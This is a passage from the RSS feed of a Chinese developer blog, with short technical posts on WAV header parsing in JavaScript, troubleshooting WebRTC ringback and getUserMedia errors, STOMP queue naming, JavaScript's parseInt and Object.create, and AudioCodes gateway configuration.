&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;Format&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readStringBE&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;Subchunk1ID&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readStringBE&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;Subchunk1Size&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readUInt32LE&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;AudioFormat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readUInt16LE&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;NumChannels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readUInt16LE&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;SampleRate&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readUInt32LE&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;ByteRate&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readUInt32LE&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;BlockAlign&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readUInt16LE&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;BitsPerSample&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readUInt16LE&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;Subchunk2ID&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readStringBE&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;Subchunk2Size&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readUInt32LE&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;Data&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// var data = readData(friendData.Data, friendData.BlockAlign, &amp;#39;readInt16LE&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;validWav&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;friendData&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;friendData&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;friendData&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Data&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// console.log(data)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从输出的内容可以看到，个个头字段基本上都读取出来了。&lt;/p&gt;</description>
    </item>
    <item>
      <title>记一次WebRTC无回铃音问题排查</title>
      <link>https://wdd.js.org/fe/webrtc-has-no-earlymedia/</link>
      <pubDate>Sat, 29 Oct 2022 11:31:05 +0800</pubDate>
      <guid>https://wdd.js.org/fe/webrtc-has-no-earlymedia/</guid>
      <description>&lt;h1 id=&#34;什么是回铃音&#34;&gt;什么是回铃音？&lt;/h1&gt;
&lt;p&gt;回铃音的特点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;回铃音是由运营商送给手机的，而不是由被叫送给主叫的。&lt;/li&gt;
&lt;li&gt;回铃音的播放阶段是在被叫接听前播放，被叫一旦接听，回铃音则播放结束&lt;/li&gt;
&lt;li&gt;回铃音一般是450Hz, 嘟一秒，停4秒，5秒一个周期&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;回铃音分为三种&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;舒适噪音阶段：就是嘟一秒，停4秒的阶段&lt;/li&gt;
&lt;li&gt;彩铃阶段：有的手机，在接听之前，会向主叫方播放个性化的语音，例如放点流行音乐之类的&lt;/li&gt;
&lt;li&gt;定制回音阶段：例如被叫放立即把电话给拒绝了，但是主叫放这边并没有挂电话，而是在播放：对不起，您拨打的电话无人接听，请稍后再播&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;问题现象&#34;&gt;问题现象&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;WebRTC拨打出去之后，在客户接听之前，听不到任何回铃音。在客户接听之后，可以短暂的听到一点点回铃音。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;问题排查思路&#34;&gt;问题排查思路&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;服务端问题&lt;/li&gt;
&lt;li&gt;客户端问题&lt;/li&gt;
&lt;li&gt;网络问题&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;网络架构&#34;&gt;网络架构&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/__graphviz/489f16c87abf155331b416bed85d4af5.svg#lake_card_v2=eyJjb2RlIjoiZ3JhcGh7XG5cdHJhbmtkaXI9TFJcblx0d2VicnRjIC0tIOi3r-eUseWZqCBbbGFiZWw9XCJhXCJdXG5cdOi3r-eUseWZqCAtLSDkupLogZTnvZFcblx05LqS6IGU572RIC0tIFNJUOacjeWKoeWZqEEgXG5cdFNJUOacjeWKoeWZqEEgLS0gU0lQ5pyN5Yqh5ZmoQiBbbGFiZWw9XCJiXCJdXG59IiwidHlwZSI6ImdyYXBodml6IiwibWFyZ2luIjp0cnVlLCJpZCI6IklZVlplIiwidXJsIjoiaHR0cHM6Ly9jZG4ubmxhcmsuY29tL3l1cXVlL19fZ3JhcGh2aXovNDg5ZjE2Yzg3YWJmMTU1MzMxYjQxNmJlZDg1ZDRhZjUuc3ZnIiwiaGVpZ2h0Ijo4MiwiY2FyZCI6ImRpYWdyYW0ifQ==&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;首先根据网络架构图，我决定在a点和b点进行抓包&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;抓包之后用wireshark进行分析。得出以下结论&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;sip服务器AB之间用的是g711编码，语音流没有加密。从b点抓的包，能够从中提取出SIP服务器B向sip服务器A发送的语音流，可以听到回铃音。说明SIP服务器A是收到了回铃音的。&lt;/li&gt;
&lt;li&gt;ab两点之间的WebRTC语音流是加密的，无法分析出其中是否含有语音流。&lt;/li&gt;
&lt;li&gt;虽然无法提取出WebRTC语音流。但是通过wireshark Statistics -&amp;gt; Conversation 分析，得出结论：在电话接通之前，a点收到的udp包和从b点发出的udp包的数量是是一致的。说明webrtc客户端实际上是收到了语音流。只不过客户端没有播放。然后问题定位到客户端的js库。&lt;/li&gt;
&lt;li&gt;通过分析客户端库的代码，定位到具体代码的位置。解决问题，并向开源库提交了修复bug的的pull request。实际上只是修改了一行代码。&lt;a href=&#34;https://github.com/versatica/JsSIP/pull/669&#34;&gt;https://github.com/versatica/JsSIP/pull/669&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;问题总结&#34;&gt;问题总结&lt;/h1&gt;
&lt;p&gt;解决问题看似很简单，但是需要的很强的问题分析能力，并且对网络协议，网络架构，wireshark抓包分析都要精通，才能真正的看到深层次的东西。&lt;/p&gt;</description>
    </item>
    <item>
      <title>WebRTC getUserMedia DOMException Requested Device not found</title>
      <link>https://wdd.js.org/fe/webrtc-domexception/</link>
      <pubDate>Sat, 29 Oct 2022 11:29:00 +0800</pubDate>
      <guid>https://wdd.js.org/fe/webrtc-domexception/</guid>
      <description>&lt;p&gt;在PC端，使用WebRTC通话一般都会使用耳麦，如果耳麦有问题，可能就会报这个错。
所以最好多换几个耳麦，试试。&lt;/p&gt;</description>
    </item>
    <item>
      <title>stompjs 使用x-queue-name指定队列名</title>
      <link>https://wdd.js.org/fe/stompjs-set-queue-name/</link>
      <pubDate>Sat, 29 Oct 2022 11:26:30 +0800</pubDate>
      <guid>https://wdd.js.org/fe/stompjs-set-queue-name/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;client&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;onConnect&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;frame&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;onConnect&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;frame&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#a6e22e&#34;&gt;client&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;subscribe&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/topic/event.agent.*.abc_cc&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     }, {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wdd&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x-queue-name&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wdd-queue&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     })
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在mq管理端：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/stompjs-set-queue-name/2022-10-29-11-27-17.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Optional Arguments
Optional queue arguments, also known as &amp;ldquo;x-arguments&amp;rdquo; because of their field name in the AMQP 0-9-1 protocol, is a map (dictionary) of arbitrary key/value pairs that can be provided by clients when a queue is declared.  -https://www.rabbitmq.com/queues.html&lt;/p&gt;</description>
    </item>
    <item>
      <title>parseInt(0.0000005)为什么等于5？</title>
      <link>https://wdd.js.org/fe/parseint-with-little-number/</link>
      <pubDate>Sat, 29 Oct 2022 11:22:57 +0800</pubDate>
      <guid>https://wdd.js.org/fe/parseint-with-little-number/</guid>
      <description>&lt;p&gt;最近看了一篇文章，里面提出一个问题？&lt;/p&gt;
&lt;p&gt;parseInt(0.0000005)为什么等于5？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/parseint-with-little-number/2022-10-29-11-24-05.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;最终也给出了解释，parseInt的第一个参数，如果不是字符串的话, 将会调用ToString方法，将其转为字符串。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;string&lt;/strong&gt;
The value to parse. If this argument is not a string, then it is converted to one using the&lt;a href=&#34;https://tc39.es/ecma262/#sec-tostring&#34;&gt;ToString&lt;/a&gt;abstract operation. Leading&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Glossary/Whitespace&#34;&gt;whitespace&lt;/a&gt;in this argument is ignored. MDN&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;我们在console面板上直接输入&lt;code&gt;0.0000005&lt;/code&gt;回车之后发现是5e-7。我们使用toSting()方法转换之后发现是字符串&lt;code&gt;5e7&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/parseint-with-little-number/2022-10-29-11-24-28.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;字符串&lt;code&gt;5e-7&lt;/code&gt;转成整数5是没什么疑问的，问题在于为什么&lt;code&gt;0.0000005&lt;/code&gt;转成5e-7。而如果少一个零，就可以看到console会原样输出。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/parseint-with-little-number/2022-10-29-11-24-41.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;数值类型如何转字符串&#34;&gt;数值类型如何转字符串？&lt;/h1&gt;
&lt;p&gt;对于数值类型，是使用Number.toString()方法转换的。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/parseint-with-little-number/2022-10-29-11-25-05.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;numbertostringx的算法分析&#34;&gt;Number.toString(x)的算法分析&lt;/h1&gt;
&lt;p&gt;这个算法并没有像我们想象的那么简单。&lt;/p&gt;
&lt;p&gt;先说一些简单场景&lt;/p&gt;
&lt;h2 id=&#34;简单场景&#34;&gt;简单场景&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Number.toString&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;如果x是NaN, 返回&amp;quot;NaN&amp;quot;&lt;/li&gt;
&lt;li&gt;如果x是+0或者-0， 返回&amp;quot;0&amp;quot;&lt;/li&gt;
&lt;li&gt;如果x是负数返回, 返回Number.toString(-x)&lt;/li&gt;
&lt;li&gt;如果x是正无穷，返回&amp;quot;Infinity&amp;quot;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;复杂场景&#34;&gt;复杂场景&lt;/h2&gt;
&lt;p&gt;可以看出，0.0000005并不在简单场景中。下面就进入到复杂场景了。&lt;/p&gt;
&lt;p&gt;会用到一个公式&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/parseint-with-little-number/2022-10-29-11-25-53.png&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;k,s,n都是整数&lt;/li&gt;
&lt;li&gt;k大于等于1&lt;/li&gt;
&lt;li&gt;10的k-1次方小于等于s, 且s小于等于10的k次方&lt;/li&gt;
&lt;li&gt;10的n-k次方属于实数&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;0.0000005可以表示为5*10的-7次方。代入上面的公式，可以算出: k=1, s=5, n=-6。&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://dmitripavlutin.com/parseint-mystery-javascript/&#34;&gt;https://dmitripavlutin.com/parseint-mystery-javascript/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt&#34;&gt;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tc39.es/ecma262/#sec-numeric-types-number-tostring&#34;&gt;https://tc39.es/ecma262/#sec-numeric-types-number-tostring&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>{} Object.create({}) Object.create{null}的区别？</title>
      <link>https://wdd.js.org/fe/js-object-create/</link>
      <pubDate>Sat, 29 Oct 2022 11:20:09 +0800</pubDate>
      <guid>https://wdd.js.org/fe/js-object-create/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Object.&lt;span style=&#34;color:#a6e22e&#34;&gt;create&lt;/span&gt;({})
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Object.&lt;span style=&#34;color:#a6e22e&#34;&gt;create&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面三个对象的区别是什么？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/js-object-create/2022-10-29-11-21-09.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/js-object-create/2022-10-29-11-21-17.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/js-object-create/2022-10-29-11-22-11.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>奥科网关 Rtp Broken Connection</title>
      <link>https://wdd.js.org/opensips/ch7/rtp-broken-connection/</link>
      <pubDate>Sat, 29 Oct 2022 10:11:59 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch7/rtp-broken-connection/</guid>
      <description>&lt;p&gt;通话10多秒后，fs对两个call leg发送bye消息。&lt;/p&gt;
&lt;p&gt;Bye消息给的原因是  Reason: Q.850 ;cause=31 ;text=”local, RTP Broken Connection”&lt;/p&gt;
&lt;p&gt;在通话的前10多秒，SIP信令正常，双方也能听到对方的声音。&lt;/p&gt;
&lt;p&gt;首先排查了下fs日志，没发现什么异常。然后根据这个报错内容，在网上搜了下。&lt;/p&gt;
&lt;p&gt;发现了这篇文章 &lt;a href=&#34;https://www.wavecoreit.com/blog/serverconfig/call-drop-transfer-rtp-broken-connection/&#34;&gt;https://www.wavecoreit.com/blog/serverconfig/call-drop-transfer-rtp-broken-connection/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这篇文章给出的解决办法是通过配置了奥科AudioCodes网关来解决的。&lt;/p&gt;
&lt;p&gt;然后咨询了下客户，证实他们用的也是奥科网关。所以就参考教程，配制了一下。&lt;/p&gt;
&lt;p&gt;主要是在两个地方进行配置&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Click Setup -&amp;gt; Signaling&amp;amp;Media -&amp;gt; Expand Coders &amp;amp; Profiles -&amp;gt; Click IP Profiles -&amp;gt; Edityour SFB Profile -&amp;gt; Broken Connection Mode-&amp;gt; Select Ignore -&amp;gt; Click Apply&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Expand SIP Definitions -&amp;gt; Click SIP Definitions General Settings -&amp;gt; Broken Connection Mode -&amp;gt; Select Ignore -&amp;gt; Click Apply -&amp;gt; Click Save&lt;/p&gt;
&lt;p&gt;这两个地方，都是配置Broken Connection Mode，选择ignore来设置的。&lt;/p&gt;
&lt;p&gt;关于RTP的connection mode，有时间再研究下。&lt;/p&gt;</description>
    </item>
    <item>
      <title>优雅停止的pod</title>
      <link>https://wdd.js.org/container/terminating-with-grace/</link>
      <pubDate>Wed, 26 Oct 2022 08:59:44 +0800</pubDate>
      <guid>https://wdd.js.org/container/terminating-with-grace/</guid>
